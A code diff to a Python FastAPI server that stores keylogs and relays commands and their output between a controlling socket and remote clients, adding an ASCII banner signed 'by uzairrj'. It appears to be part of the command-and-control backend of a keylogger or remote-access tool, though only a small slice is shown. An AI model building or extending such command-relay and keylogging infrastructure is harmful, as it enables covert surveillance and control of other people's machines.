@@ -4,7 +4,29 @@ from data.db import db
 from models.keylogs import Keylogs
 from socketManager import manager
 from fastapi.staticfiles import StaticFiles
-import json
+
+print('''
+                • ⠀⠀▓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀•⠀⠀░⠀⠀⠀⠀⠀•⠀⠀  ◾
+         ▄        ⠀⠀⢠⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀         ░
+  ▄               ⠀⠀⠀⢻⣿⣿⡿⠛⣉⣠⣤⣤⣤⣤⣀⠀⠀⠀•⠀⠀⠀⠀⠀  ▓
+               ⠀⠀⠀▄⠀⠀⠀⠟⢁⣴⣾⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀░⠀          
+      •    ░  ⣤⡀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⣿⣿⣧⠀⠀⠀⠀⠀⠀    •   •
+     ▓        ⢻⣿⣆⠀⠀⠀⢀⣾⣿⣿⡟⢀⣿⣿⣿⣿⣦⣀⣀⣀⣹⣿⣧⣀⠀⠀⠀⠀      ◾
+              ⢸⣿⣿⡆⠀⢠⣿⣿⣿⡟⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣁⡄⠀◾      █
+ •         •  ⢸⣿⠋⣠⣶⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⡀⣴⣿⠹⣷⠀⠀ •
+     ▄        ⢸⣿⠀⠿⠿⢿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⡿⠋⣠⣴⡙⣿⠈⠿⠀⠘⠀⠀  •
+          ▓   ⢸⣿⣷⣦⠀⠈⠻⣿⣿⢿⣾⣿⣿⣿⣿⠋⢀⡈⠃⠈⠁⠀⠀⠀⠀⠀⠀⠀⠈      ▓
+              ⢸⣿⡿⠃⠀⠀⠀⢀⣠⣴⣿⡿⣿⣿⣿⣦⡈⠻⣠⣴⢀⡴⠀⣀⠀⣰⠀⠀             
+     •        ⢸⠟⠁⠀⠠⠴⣾⣿⣿⣿⡿⠀⣾⣿⣿⣿⣿⣦⣈⠁⠾⢇⡼⠿⠞⠛⠀⠀  ░
+ ◾        •   ⠀•⠀⠀⠀⠀⠀⠙⠿⣿⠇⠈⠻⠿⣿⣿⣿⣿⣿⣷⣶⣤⣤⣶⠖⠀⠀⠀    ◾ 
+            ⠀⠀⠀⠀⠀⠀⠀⠀▄⠀⠀⠉⠀•⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀        ⠈ 
+ ▀██▀▀█▄   ██          •    ░        •  ▀██   ⠈        ◾
+  ██   ██ ▄▄▄  ▄▄▄ ▄▄   ▄▄▄▄   ▄▄ ▄▄▄    ██ ▄▄    ▄▄▄•
+  ██▄▄▄█▀  ██   ██▀ ▀▀ ▀▀ ▄██   ██  ██   ██▀ ██  ▀▀ ▄██
+  ██       ██   ██     ▄█▀ ██   ██  ██   ██  ██  ▄█▀ ██
+ ▄██▄     ▄██▄ ▄██▄    ▀█▄▄▀█▀ ▄██▄ ██▄ ▄██▄ ██▄ ▀█▄▄▀█▀
+                                              by uzairrj
+''')
 
 server = FastAPI()
 
@@ -46,9 +68,13 @@ async def sendCommand(type:str,id:str, socket:WebSocket):
         while True:
             data = await socket.receive_json()
             if data["type"] == "server":
-                await sockets.sendCommand(data["id"], data["command"])
+                await sockets.sendCommand(data["id"], {
+                    "arg":data["arg"],
+                    "command":data["command"],
+                    "id": id
+                })
             else:
-                    await sockets.recieveOutput(data["id"], data["output"])
+                    await sockets.recieveOutput(data["id"], {"output":data["output"]})
     except WebSocketDisconnect:
         if type == "server":
             sockets.disconnectServer(id)
